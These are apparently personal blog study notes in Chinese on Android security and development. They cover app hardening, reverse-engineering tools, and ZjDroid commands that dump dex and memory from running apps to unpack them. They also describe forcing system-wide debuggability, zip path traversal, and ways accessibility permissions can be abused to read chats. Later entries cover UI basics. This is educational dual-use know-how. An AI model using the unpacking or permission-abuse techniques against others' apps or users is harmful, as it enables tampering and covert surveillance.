<p>需要加密的apk（源apk）</p>
<p>自己的壳程序apk（负责解密apk工作）</p>
<p>加密工具（将源apk进行加密和壳dex合并成新的dex）</p>
<p><img src="./day13/1.jpg" alt=""></p>
<p>加固的主要步骤：拿到需要加密的apk和自己的壳程序apk，然后用加密算法对源apk进行加密，再将壳apk进行合并得到新的dex文件，最后替换壳程序中的dex文件即可，得到新的apk，这个新的apk也叫做脱壳程序apk（它的主要工作是解密源apk，然后加载apk，让其正常运行起来）。</p>
<p>常用反编译工具：jd-gui、dex2jar。</p>
<h1 id="Android中的so加固原理"><a href="#Android中的so加固原理" class="headerlink" title="Android中的so加固原理"></a>Android中的so加固原理</h1><h2 id="基于对so中section加密实现so加固"><a href="#基于对so中section加密实现so加固" class="headerlink" title="基于对so中section加密实现so加固"></a>基于对so中section加密实现so加固</h2><h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><p>加密过程：找到so文件中一个section的起始地址和大小就可以对这个section进行加密了。</p>
<p>解密过程：对于一个so文件，当被加载到程序后，可以使用<code>__attrbute__((constructor));</code>这个属性（这个属性优先于main方法之前执行，类似java中的构造函数，C++的构造函数即是基于这个属性实现的）。</p>
<h2 id="基于对so中的函数加密实现so加固"><a href="#基于对so中的函数加密实现so加固" class="headerlink" title="基于对so中的函数加密实现so加固"></a>基于对so中的函数加密实现so加固</h2><h1 id="Android逆向分析基础"><a href="#Android逆向分析基础" class="headerlink" title="Android逆向分析基础"></a>Android逆向分析基础</h1><h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><ul>
<li>apktool</li>
<li>dex2jar+jd-gui</li>
<li>JEB和Jadx</li>
<li>Xposed</li>
<li>Cydia Substrate</li>
<li>ZjDroid</li>
<li>IDA</li>
</ul>
<h2 id="打开系统调试总开关"><a href="#打开系统调试总开关" class="headerlink" title="打开系统调试总开关"></a>打开系统调试总开关</h2><p>Android中一些常用的配置信息都存放在/system/build.prop文件中。</p>
<p>通过使用getprop和setprop命令，可以获取和设置这些属性，另外ro开头的属性是不允许后期修改的。</p>
<p>而/system/defult.prop中的ro.debuggable（当Dalvik虚拟机从Android应用框架中启动时，这个值为1）这个值如果为1，那么系统中所有的程序都是可以调试的。如果该值为0，则会判断程序AndroidManifest.xml中android:debuggable元素是否为true，如果为true则开启调试支持。</p>
<p>设置ro.debuggable的三种方式：</p>
<ul>
<li>直接修改default.prop文件中的值，然后重启设备。</li>
<li>改写系统文件，重新编译系统镜像文件，然后刷入到设备中。</li>
<li>注入init进程，修改内存中的属性值。</li>
</ul>
<p>网上已有最后一种方式（最稳定）的实现工具mprop</p>
<h1 id="反编译神器apktool和Jadx"><a href="#反编译神器apktool和Jadx" class="headerlink" title="反编译神器apktool和Jadx"></a>反编译神器apktool和Jadx</h1><h2 id="分析apktool的源码"><a href="#分析apktool的源码" class="headerlink" title="分析apktool的源码"></a>分析apktool的源码</h2><p>源码地址为<a href="https://code.google.com/p/android-apktool/。github的地址：https://github.com/iBotPeaches/Apktool。" target="_blank" rel="noopener">https://code.google.com/p/android-apktool/。github的地址：https://github.com/iBotPeaches/Apktool。</a></p>
<h2 id="Jadx源码分析"><a href="#Jadx源码分析" class="headerlink" title="Jadx源码分析"></a>Jadx源码分析</h2><p>源码地址：<a href="https://github.com/skylot/jadx。" target="_blank" rel="noopener">https://github.com/skylot/jadx。</a></p>
<h1 id="HOOK神器Xposed"><a href="#HOOK神器Xposed" class="headerlink" title="HOOK神器Xposed"></a>HOOK神器Xposed</h1><h2 id="编写模块功能"><a href="#编写模块功能" class="headerlink" title="编写模块功能"></a>编写模块功能</h2><p>暂略，后面争取开一章学习</p>
<h1 id="脱壳神器ZjDroid"><a href="#脱壳神器ZjDroid" class="headerlink" title="脱壳神器ZjDroid"></a>脱壳神器ZjDroid</h1><p>源码地址：<a href="http://github.com/halfkiss/ZjDroid" target="_blank" rel="noopener">http://github.com/halfkiss/ZjDroid</a></p>
<h2 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h2><h3 id="dump-dexinfo"><a href="#dump-dexinfo" class="headerlink" title="dump_dexinfo"></a>dump_dexinfo</h3><p>用于获取应用运行时内存中的dex信息。对应函数为DumpDexInfoCommandHandler。</p>
<p>用法<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_dexinfo&quot;)&#39;</code></p>
<h3 id="dump-dexfile"><a href="#dump-dexfile" class="headerlink" title="dump_dexfile"></a>dump_dexfile</h3><p>用于dump出应用内存中dex文件。对应函数为DumpDexFileCommandHandler。</p>
<p>用法：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_dexfile&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p>
<p>其中dexpath参数代表需要脱壳的dex文件，也就是应用程序文件。</p>
<p>脱壳后的文件在/data/data/xxx/files/dexdump.odex</p>
<h3 id="backsmali"><a href="#backsmali" class="headerlink" title="backsmali"></a>backsmali</h3><p>该命令与上一命令功能差不多，只不过还增加了把dex文件转化为smali文件的功能。</p>
<p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;backsmali&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p>
<p>最终生成文件在/data/data/xxx/smali下。</p>
<h3 id="dump-mem"><a href="#dump-mem" class="headerlink" title="dump_mem"></a>dump_mem</h3><p>这个命令用来dump出应用程序运行时内存中指定开始位置和长度的内存块数据的。对应函数DumpMemCommandHandler。</p>
<p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_mem&quot;, &quot;start&quot;:111, &quot;length&quot;:222)&#39;</code></p>
<p>其中start和length都是十进制。</p>
<h3 id="dump-heap"><a href="#dump-heap" class="headerlink" title="dump_heap"></a>dump_heap</h3><p>该命令用于dump出虚拟机的堆内存信息，可以用于java heap工具分析。</p>
<p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_heap&quot;)&#39;</code></p>
<h3 id="dump-class"><a href="#dump-class" class="headerlink" title="dump_class"></a>dump_class</h3><p>这个命令主要用于dump出dex文件中的类信息。因为在DexFile对象中有一个隐藏的方法可以把dex文件中所有类名获取到getClassNameList。</p>
<p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_heap&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p>
<h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>这个命令用于运行时动态调用Lua脚本，该功能可以通过Lia脚本动态调用Java代码。</p>
<p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;invoke&quot;, &quot;filepath&quot;:&quot;*****&quot;)&#39;</code></p>
<h2 id="工具日志信息"><a href="#工具日志信息" class="headerlink" title="工具日志信息"></a>工具日志信息</h2><p>两个tag可以用于查看相应日志：</p>
<p>zjdroid-shell-{package name}：该tag可以查看上面每个命令执行的结果，便于查看命令执行状态。</p>
<p>zjdroid-apimonitor-{package name}：该tag可以监听对应包名应用调用的API信息，类似于运行时权限请求。</p>
<h1 id="Native层Hook神奇Cydia-Substrate"><a href="#Native层Hook神奇Cydia-Substrate" class="headerlink" title="Native层Hook神奇Cydia Substrate"></a>Native层Hook神奇Cydia Substrate</h1><p><a href="http://www.cydiasubstrate.com" target="_blank" rel="noopener">http://www.cydiasubstrate.com</a></p>
<p>略，有机会再尝试。</p>
<h1 id="静态方式逆向应用"><a href="#静态方式逆向应用" class="headerlink" title="静态方式逆向应用"></a>静态方式逆向应用</h1><h3 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h3><h3 id="手动注入smali语句"><a href="#手动注入smali语句" class="headerlink" title="手动注入smali语句"></a>手动注入smali语句</h3><h3 id="ARM指令"><a href="#ARM指令" class="headerlink" title="ARM指令"></a>ARM指令</h3><h1 id="动态调试smali源码"><a href="#动态调试smali源码" class="headerlink" title="动态调试smali源码"></a>动态调试smali源码</h1><p>步骤：</p>
<ol>
<li>建议apk：修改debug属性为true，同时加上waitForDebug，从而允许调试</li>
<li>回编译apk：回编译并签名、安装</li>
<li>将反编译samli工程导入Eclipse</li>
<li>设置远程调试</li>
<li>调试apk程序</li>
<li>编写代码实现核心逻辑</li>
</ol>
<p>jeb也有调试功能，只需要加载app，然后在adb中运行<code>am start -n [packagename]/[packagename].[Activity] -D</code>即可attach上去。</p>
<h1 id="IDA调试so源码"><a href="#IDA调试so源码" class="headerlink" title="IDA调试so源码"></a>IDA调试so源码</h1><h3 id="获取android-server"><a href="#获取android-server" class="headerlink" title="获取android_server"></a>获取android_server</h3><p>在IDA目录下/dbgsrv/android/server。将该文件移动到设备目录/data下，接着运行，这样就打开了监听设备的端口（这里以23946端口为例，可以通过-p参数修改端口）。</p>
<p>然后运行adb命令：<code>adb forward tcp:远程设备端口 tcp:本地端口</code>，即可以写成<code>adb forward tcp:23946 tcp:23946</code>。</p>
<h3 id="IDA获取进程信息"><a href="#IDA获取进程信息" class="headerlink" title="IDA获取进程信息"></a>IDA获取进程信息</h3><p>打开IDA，在Debugger中选择Android debugger选项，然后attach上去（127.0.0.1:23946）。</p>
<h3 id="找到函数地址下断点"><a href="#找到函数地址下断点" class="headerlink" title="找到函数地址下断点"></a>找到函数地址下断点</h3><p>到这里就跟平时elf调试差不多了，略过</p>
<h1 id="Android中常见漏洞分析"><a href="#Android中常见漏洞分析" class="headerlink" title="Android中常见漏洞分析"></a>Android中常见漏洞分析</h1><h2 id="解压文件漏洞分析"><a href="#解压文件漏洞分析" class="headerlink" title="解压文件漏洞分析"></a>解压文件漏洞分析</h2><p>因为ZipEntry对传入的文件名没有限制，导致可以使用<code>../</code>等字符从而随意覆盖本地文件。</p>
<h2 id="录屏授权漏洞分析"><a href="#录屏授权漏洞分析" class="headerlink" title="录屏授权漏洞分析"></a>录屏授权漏洞分析</h2><p>由于提示信息展示的时候没有做省略处理，从而把最重要的提示文案隐藏，导致用户被骗，同意授权。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day12</title>
    <url>/2020/06/08/Android/Android-day12/</url>
    <content><![CDATA[<h1 id="Android应用安全防护的基本策略"><a href="#Android应用安全防护的基本策略" class="headerlink" title="Android应用安全防护的基本策略"></a>Android应用安全防护的基本策略</h1><h2 id="混淆机制"><a href="#混淆机制" class="headerlink" title="混淆机制"></a>混淆机制</h2><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>在反编译apk后，看到的代码类名、方法名已经代码格式看起来不像正常的Android项目代码，这就是经过混淆的代码。</p>
<h3 id="资源混淆"><a href="#资源混淆" class="headerlink" title="资源混淆"></a>资源混淆</h3><p>资源混淆的功能具体可看微信团队的开源项目：<a href="https://github.com/shwenzhang/AndResGuard。" target="_blank" rel="noopener">https://github.com/shwenzhang/AndResGuard。</a></p>
<p>对于资源混淆，在获取到资源对于的int类型值后，可在/res/values/public.xml找到对应的一个name项的值，然后通过这个name的值可以在相应的xml中查找到对应的资源。</p>
<h2 id="签名保护"><a href="#签名保护" class="headerlink" title="签名保护"></a>签名保护</h2><p>Android中每个应用都有一个唯一的签名。</p>
<p>为了防止应用被二次打包，可以在程序入口处添加签名验证，从而防止运行被修改的程序。</p>
<h2 id="手动注册native方法"><a href="#手动注册native方法" class="headerlink" title="手动注册native方法"></a>手动注册native方法</h2><p>在Android中，当程序Java层运行System.loadLibrary(“jnitest”);这行代码后，程序会去载入jnitest.so文件。与此同时，产生一个Load事件，这个事件触发后，程序默认会在载入的.so文件的函数列表中查找JNI_OnLoad函数并执行（卸载时触发UnLoad事件，并查找JNI_OnUnload函数执行。JNI_OnLoad和JNI_OnUnload函数并不强制要求用户去实现）。一般情况下，在C组件中的JNI_OnLoad函数用来实现给VM注册接口，以方便VM可以快速地找到Java代码需要调用的C函数。</p>
<p>应用层的Java类通过VM而调用native函数，这个搜索的过程可能较为漫长。C组件开发者可以将本地函数向VM进行注册，从而加快后续调用native函数的效率。</p>
<p>一般而言，对应native层的函数名是：<code>Java_类名_方法名</code></p>
<p>显示注册需要在native层的代码中调用如下三个函数：</p>
<p><code>(*env)-&gt;RegisterNatives(env, clazz, methods, methodsLenght)</code>：这个函数用于手动手动注册native方法。clazz就是需要注册native方法的那个类，methods是一个结构体包含name（Java中函数的名字）、signature（用字符串描述了函数的参数和返回值）、fnPtr（函数指针，指向C函数）。</p>
<p><code>jint JNI_OnLoad(JavaVM* vm, void* reserved)</code>：在这个函数里面执行上面的注册函数。</p>
<p><code>void JNI_OnUnload(JavaVM* vm, void* reserved)</code></p>
<h2 id="反调试检测"><a href="#反调试检测" class="headerlink" title="反调试检测"></a>反调试检测</h2><p>ptrace机制有一个特点：如果一个进程被调试了，在它进程的status文件中有一个字段TracerPid会记录调试者的进程id值。通过判断这个TracerPid的值是否为0，就可以判断是否被调试中，从而实现反调试。</p>
<h1 id="Android中常用权限分析"><a href="#Android中常用权限分析" class="headerlink" title="Android中常用权限分析"></a>Android中常用权限分析</h1><h2 id="辅助功能权限"><a href="#辅助功能权限" class="headerlink" title="辅助功能权限"></a>辅助功能权限</h2><p>Android提供了辅助（Accessibility）功能和服务帮助用户更加简单地操作设备，包括文字转语音、触觉反馈、手势操作、轨迹球和手柄操作。辅助功能实质上就是监听应用窗口变化和事件。</p>
<p>使用辅助功能的时候必须声明以下权限：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">application</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:name</span>=<span class="string">".MyAcessibilityService"</span></span></span><br><span class="line"><span class="tag">             <span class="attr">android:label</span>=<span class="string">"@string/accessibility_service_label"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.accessibilityservice.AcessibilityService"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permisson</span> <span class="attr">android:name</span>=<span class="string">"android.permission.BIND_ACCESSIBILITY_SERVICE"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在代码中直接打开相应的Intent跳转到授权界面：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Intent accIntent = <span class="keyword">new</span> Intent(Setting.ACTION_ACCESSIBILITY_SERVICE);</span><br><span class="line">startActivity(accIntent);</span><br></pre></td></tr></table></figure>

<p>存在的风险：可以监听设备当前的窗口变化，分析当前应用的View结构之后模拟点击：</p>
<ul>
<li>模拟一些社交App的登录窗口页面，这样用户是无感知的。</li>
<li>当监听到当前应用是社交App，而且是聊天记录页面时，就可以得知当前聊天记录。</li>
<li>分析设备中的应用情况，在用户不知情的情况下，模拟点击任何一个应用进行操作，从而获取信息。</li>
</ul>
<h2 id="设备管理权限"><a href="#设备管理权限" class="headerlink" title="设备管理权限"></a>设备管理权限</h2><p>作用类似于iPhone中的“查找我的手机”功能，可以快速定位以及擦除设备数据等。另外还可以防止被卸载。</p>
<p>存在的风险：申请这个权限后，设备相当于是给申请者管理了，他们可以修改设备的锁屏密码、擦除数据等。</p>
<h2 id="通知栏管理权限"><a href="#通知栏管理权限" class="headerlink" title="通知栏管理权限"></a>通知栏管理权限</h2><p>这个功能专门用于监听设备的通知栏消息。</p>
<p>存在的风险：与辅助功能一样，申请这个权限后用户设备的通知栏消息就会被它接管。</p>
<h2 id="VPN开发权限"><a href="#VPN开发权限" class="headerlink" title="VPN开发权限"></a>VPN开发权限</h2><p>存在的风险：如果申请了这个权限，就代表这个设备的网络访问消息会被申请者接管。</p>
<h1 id="Android中的run-as命令"><a href="#Android中的run-as命令" class="headerlink" title="Android中的run-as命令"></a>Android中的run-as命令</h1><p>run-as命令的作用是可以用root身份运行命令，但是必须携带指定应用包名参数，而且这个应用是debug模式的。即开发中如果想看自己应用的沙盒数据(/data/data/xxx/)，在设备没有root的情况下，可以使用这个命令进行查看。</p>
<h2 id="命令分析和使用"><a href="#命令分析和使用" class="headerlink" title="命令分析和使用"></a>命令分析和使用</h2><p>使用run-as [packagename]后即可进入相应的目录：/data/data/packagename/。</p>
<p>Android中命令一般都在/system/bin和/system/xbin目录下，对应的源码都在Android源码目录下的/system/core下。</p>
<p>run-as命令运行是有诸多限制的：</p>
<ul>
<li><p>运行命令的用户id只能是shell和root用户</p>
</li>
<li><p>应用的安装必须合法</p>
</li>
<li><p>应用的uid必须合法</p>
</li>
<li><p>应用是否为debug模式</p>
</li>
</ul>
<h2 id="Linux中的setuid和setgid概念"><a href="#Linux中的setuid和setgid概念" class="headerlink" title="Linux中的setuid和setgid概念"></a>Linux中的setuid和setgid概念</h2><p>Linux/Unix下的可执行文件一旦被设置了setuid标记，使用该可执行程序的进程就将拥有该执行文件的所有者权限。</p>
<h2 id="Android中setuid和setgid的使用场景"><a href="#Android中setuid和setgid的使用场景" class="headerlink" title="Android中setuid和setgid的使用场景"></a>Android中setuid和setgid的使用场景</h2><h3 id="zygote降级处理"><a href="#zygote降级处理" class="headerlink" title="zygote降级处理"></a>zygote降级处理</h3><p>zygote启动后，会进入一个轮询使用socket来监听ActivityManagerService发来的消息，比如应用的启动，zygote就fork出一个进程，开始运转。因为zygote是root用户的，所以zygote通过setuid、setgid进行降级处理，避免所有fork出来的程序都是root权限。</p>
<h3 id="su工具原理"><a href="#su工具原理" class="headerlink" title="su工具原理"></a>su工具原理</h3><p>Android手机的root原理是：一个普通进程通过执行su，从而获得一个具有root权限的进程。通过配合superuser这款app，可以在需要时对应用进行授权，从而避免了root权限的滥用。</p>
<h3 id="run-as命令"><a href="#run-as命令" class="headerlink" title="run-as命令"></a>run-as命令</h3><p>run-as命令本身的uid是root，gid是shell。</p>
<h2 id="run-as命令的作用"><a href="#run-as命令的作用" class="headerlink" title="run-as命令的作用"></a>run-as命令的作用</h2><p>在Android中要调试一个程序，首先这个程序必须是debug模式的，也就是在AndroidManifest.xml中设置的属性，所以一般是修改XML中的debug属性，然后才进行代码关联调试。</p>
<h1 id="Android中的allowBackup属性"><a href="#Android中的allowBackup属性" class="headerlink" title="Android中的allowBackup属性"></a>Android中的allowBackup属性</h1><h2 id="allowBackup属性介绍"><a href="#allowBackup属性介绍" class="headerlink" title="allowBackup属性介绍"></a>allowBackup属性介绍</h2><p>Android API Level 8及以上Android系统提供了位应用程序数据的备份和恢复功能，此功能的开关由应用程序中AndroidManifest.xml文件中的allowBackup属性值决定，其默认为true，可通过<code>adb backup</code>或<code>adb restore</code>命令对应用数据进行备份和恢复。</p>
<p>这个属性的安全风险源于adb backup命令容许任何一个能够打开USB调试开关的人从Android手机中复制应用数据到外设，一旦应用数据被备份后，所有应用数据都可被用户读取；adb restore容许用户指定一个回复的数据，来源来恢复应用程序数据的创建。</p>
<h1 id="Android中的签名机制"><a href="#Android中的签名机制" class="headerlink" title="Android中的签名机制"></a>Android中的签名机制</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="数据摘要"><a href="#数据摘要" class="headerlink" title="数据摘要"></a>数据摘要</h3><p>数据摘要其实是一种算法，就是对一个数据源进行一个算法操作之后得到一个摘要，也叫作数据指纹。</p>
<p>消息摘要算法是一种能产生特殊输出格式的算法，其原理是根据一定的运算规则对原始数据进行某种形式的消息提取，提取出的信息就称为原始数据的数据摘要。</p>
<h3 id="签名文件和证书文件"><a href="#签名文件和证书文件" class="headerlink" title="签名文件和证书文件"></a>签名文件和证书文件</h3><p>签名文件和证书文件是成对出现的，二者不可分离。</p>
<h3 id="jarsign和signapk工具"><a href="#jarsign和signapk工具" class="headerlink" title="jarsign和signapk工具"></a>jarsign和signapk工具</h3><p>这两个是Android中的签名工具。jarsign是用于jar签名，signapk是用于apk签名。</p>
<h2 id="Android中的签名流程"><a href="#Android中的签名流程" class="headerlink" title="Android中的签名流程"></a>Android中的签名流程</h2><p>signapk的源码位于：Android源码中的 com/android/signapk/sign.java。</p>
<p>Android签名apk后，会有一个META-INF目录，这里有三个文件：MANIFEST.MF、CERT.SF、CERT.RSA。</p>
<h3 id="MANIFEST-MF"><a href="#MANIFEST-MF" class="headerlink" title="MANIFEST.MF"></a>MANIFEST.MF</h3><p>这个文件主要包括apk中所有文件的数据摘要内容。</p>
<h3 id="CERT-SF"><a href="#CERT-SF" class="headerlink" title="CERT.SF"></a>CERT.SF</h3><p>这个文件先对之前的MANIFEST.MF整个内容做一个SHA1方法哦SHA1-Digest-Manifest字段中。</p>
<p>然后逐条计算MANIFEST.MF文件中每一个块的SHA1，并进过BASE64编码后，记录在CERT.SF同名块中，属性名是SHA1-Digest。</p>
<h3 id="CERT-RSA"><a href="#CERT-RSA" class="headerlink" title="CERT.RSA"></a>CERT.RSA</h3><p>这个文件就是对前面CERT.SF文件做签名操作后的结果，也就是前面提到的签名文件。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day3</title>
    <url>/2020/05/27/Android/Android-day3/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>UI开发这块跟代码逻辑无关，所以快速扫过吧，具体内容可以直接找找官方文档。</p>
<h1 id="UI开发"><a href="#UI开发" class="headerlink" title="UI开发"></a>UI开发</h1><h2 id="常用的控件"><a href="#常用的控件" class="headerlink" title="常用的控件"></a>常用的控件</h2><h3 id="TestView"><a href="#TestView" class="headerlink" title="TestView"></a>TestView</h3><p>用于显示文本显示。</p>
<h3 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h3><p>用于实现按钮。</p>
<h3 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h3><p>用于实现输入框。</p>
<p>可以使用如下方法获取输入框内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">EditText editText;</span><br><span class="line">editText = (EditText) findViewById(R.id.edit_text);</span><br><span class="line">Log.d(<span class="string">"MainActivity"</span>, editText.getText().toString())</span><br></pre></td></tr></table></figure>

<h3 id="ImageView"><a href="#ImageView" class="headerlink" title="ImageView"></a>ImageView</h3><p>用于在界面上显示图片。</p>
<p>可以用如下代码修改显示的图片为img_2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ImageView imageView;</span><br><span class="line">imageView &#x3D; (ImageView) findViewById(R.id.image_view);</span><br><span class="line">imageView.setImageResource(R.drawable.img_2);</span><br></pre></td></tr></table></figure>

<h3 id="ProgressBar"><a href="#ProgressBar" class="headerlink" title="ProgressBar"></a>ProgressBar</h3><p>用于显示进度条，表示我们的程序正在加载一些项目。</p>
<p>我们通过控件的setVisibility()来传入View.VISIBLE、View.INVISIBLE和View.GONE这三种值来设置控件的可见性，从而可以进行ProgressBar和其他控件的切换。</p>
<p>getVisibility()方法可以可判断控件是否可见。</p>
<h3 id="AlertDialog"><a href="#AlertDialog" class="headerlink" title="AlertDialog"></a>AlertDialog</h3><p>用于在当前界面弹出一个对话框，这个对话框是置顶于所有界面元素之上的，能够屏蔽掉其他控件的交互能力。</p>
<p>可以在活动中用以下代码创建：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AlertDialog.Builder dialog = <span class="keyword">new</span> AlertDialog.Builder(MainActivity.<span class="keyword">this</span>);</span><br><span class="line">dialog.setTitle(<span class="string">"This is Dialog"</span>);</span><br><span class="line">dialog.setMessage(<span class="string">"Something important"</span>);</span><br><span class="line">dialog.cancelable(<span class="keyword">false</span>);</span><br><span class="line">dialog.setPositiveButton(<span class="string">"OK"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener()&#123;</span><br><span class="line">	<span class="meta">@override</span></span><br><span class="line">	<span class="function">pubilc <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">dialog.setNegativeButton(<span class="string">"Cancel"</span>, <span class="keyword">new</span> DialogInterface.OnClickListener()&#123;</span><br><span class="line">	<span class="meta">@override</span></span><br><span class="line">	<span class="function">pubilc <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(DialogInterface dialog, <span class="keyword">int</span> which)</span></span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>创建完成后就可以用dialog.show()调用该AlertDialog了。</p>
<h3 id="ProgressDialog"><a href="#ProgressDialog" class="headerlink" title="ProgressDialog"></a>ProgressDialog</h3><p>弹出对话框以显示进度条。</p>
<h2 id="详解四种基本布局"><a href="#详解四种基本布局" class="headerlink" title="详解四种基本布局"></a>详解四种基本布局</h2><p><img src="./day3/1.jpg" alt=""></p>
<h3 id="LinearLayout线性布局"><a href="#LinearLayout线性布局" class="headerlink" title="LinearLayout线性布局"></a>LinearLayout线性布局</h3><h3 id="RelativeLayout相对布局"><a href="#RelativeLayout相对布局" class="headerlink" title="RelativeLayout相对布局"></a>RelativeLayout相对布局</h3><h3 id="FrameLayout帧布局"><a href="#FrameLayout帧布局" class="headerlink" title="FrameLayout帧布局"></a>FrameLayout帧布局</h3><h3 id="百分比布局"><a href="#百分比布局" class="headerlink" title="百分比布局"></a>百分比布局</h3><h2 id="创建自定义控件"><a href="#创建自定义控件" class="headerlink" title="创建自定义控件"></a>创建自定义控件</h2><p><img src="./day3/2.jpg" alt=""></p>
<p>View是Android中最基本的一种UI组件，它可以在屏幕上绘制一块矩形区域，并能响应这块区域的各种事件。</p>
<h2 id="ListView"><a href="#ListView" class="headerlink" title="ListView"></a>ListView</h2><h2 id="RecyclerView"><a href="#RecyclerView" class="headerlink" title="RecyclerView"></a>RecyclerView</h2><h1 id="探究碎片"><a href="#探究碎片" class="headerlink" title="探究碎片"></a>探究碎片</h1><h2 id="什么是碎片"><a href="#什么是碎片" class="headerlink" title="什么是碎片"></a>什么是碎片</h2><p>碎片是一种可以嵌入在活动当中的UI片段，它能让程序更加合理和充分地利用大屏幕的空间。</p>
<h2 id="动态添加碎片"><a href="#动态添加碎片" class="headerlink" title="动态添加碎片"></a>动态添加碎片</h2><p>动态添加碎片主要分为5步：</p>
<ol>
<li>创建待添加的碎片实例。</li>
<li>获取FragmentManager，在活动中可以直接通过调用getSupportFragmentManager()方法得到。</li>
<li>开启一个事务，通过调用beginTransaction()方法开启。</li>
<li>向容器内添加或替换碎片，一般使用replace()方法实现，需要传入容器的id和待添加的碎片实例。</li>
<li>提交事务，调用commit()方法来完成。</li>
</ol>
<h2 id="碎片的生命周期"><a href="#碎片的生命周期" class="headerlink" title="碎片的生命周期"></a>碎片的生命周期</h2><h3 id="碎片的状态和回调"><a href="#碎片的状态和回调" class="headerlink" title="碎片的状态和回调"></a>碎片的状态和回调</h3><h4 id="状态"><a href="#状态" class="headerlink" title="状态"></a>状态</h4><p>运行状态：当一个碎片是可见的，并且它所关联的活动正处于运行状态时，该碎片也处于运行状态。</p>
<p>暂停状态：当一个活动进入暂停状态，与它相关联的可见碎片就会进入到暂停状态。</p>
<p>停止状态：当一个活动进入停止状态时，与它相关联的碎片就会进入到停止状态，或者通过调用FragmentTransaction的remove()、replace()方法将碎片从活动中移除，但如果在事务提交之前调用addToBackStack()方法，这时的碎片也会进入到停止状态。</p>
<p>销毁状态：碎片总是依附于活动而存在的，因此当活动被销毁时，与它相关联的碎片就会进入到销毁状态。或者通过调用FragmentTransaction的remove()、replace()方法将碎片从活动中移除，但在事务提交之前并没有调用addToBackStack()方法，这时的碎片也会进入到销毁状态。</p>
<h4 id="回调方法"><a href="#回调方法" class="headerlink" title="回调方法"></a>回调方法</h4><p>onAttach()当碎片和活动建立关系的时候调用。</p>
<p>onCreateView()为碎片创建视图（加载布局）时调用。</p>
<p>onActivityCreated()确保与碎片相关联的活动一定已经创建完毕的时候调用。</p>
<p>onDestoryView()当与碎片关联的视图被移除的时候调用。</p>
<p>onDetach()当碎片和活动解除关联的时候调用。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day11</title>
    <url>/2020/06/06/Android/Android-day11/</url>
    <content><![CDATA[<h1 id="AndroidManifest-xml文件格式解析"><a href="#AndroidManifest-xml文件格式解析" class="headerlink" title="AndroidManifest.xml文件格式解析"></a>AndroidManifest.xml文件格式解析</h1><h2 id="格式分析"><a href="#格式分析" class="headerlink" title="格式分析"></a>格式分析</h2><p><img src="./day11/1.png" alt=""></p>
<h2 id="格式分析-1"><a href="#格式分析-1" class="headerlink" title="格式分析"></a>格式分析</h2><h3 id="头部信息"><a href="#头部信息" class="headerlink" title="头部信息"></a>头部信息</h3><p>每个头部固定有以下字段：</p>
<ul>
<li>文件魔数：4字节</li>
<li>文件大小：4字节</li>
</ul>
<h3 id="解析String-Chunk"><a href="#解析String-Chunk" class="headerlink" title="解析String Chunk"></a>解析String Chunk</h3><ul>
